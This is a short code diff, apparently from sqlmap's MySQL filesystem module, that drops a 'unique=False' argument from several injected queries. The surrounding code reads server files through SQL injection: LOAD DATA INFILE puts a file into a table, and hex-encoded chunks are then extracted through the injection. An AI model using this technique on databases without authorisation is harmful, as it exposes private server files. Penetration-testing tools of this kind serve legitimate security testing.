@@ -54,7 +54,7 @@ class Filesystem(GenericFilesystem):
         logger.debug(debugMsg)
         inject.goStacked("LOAD DATA INFILE '%s' INTO TABLE %s FIELDS TERMINATED BY '%s' (%s)" % (tmpFile, self.fileTblName, randomStr(10), self.tblField))
 
-        length = inject.getValue("SELECT LENGTH(%s) FROM %s" % (self.tblField, self.fileTblName), unique=False, resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
+        length = inject.getValue("SELECT LENGTH(%s) FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
 
         if not isNumPosStrValue(length):
             warnMsg = "unable to retrieve the content of the "
@@ -74,11 +74,11 @@ class Filesystem(GenericFilesystem):
                 result = []
 
                 for i in xrange(1, length, sustrLen):
-                    chunk = inject.getValue("SELECT MID(%s, %d, %d) FROM %s" % (self.tblField, i, sustrLen, self.fileTblName), unpack=False, unique=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
+                    chunk = inject.getValue("SELECT MID(%s, %d, %d) FROM %s" % (self.tblField, i, sustrLen, self.fileTblName), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
 
                     result.append(chunk)
             else:
-                result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), unique=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
+                result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
 
         return result
 
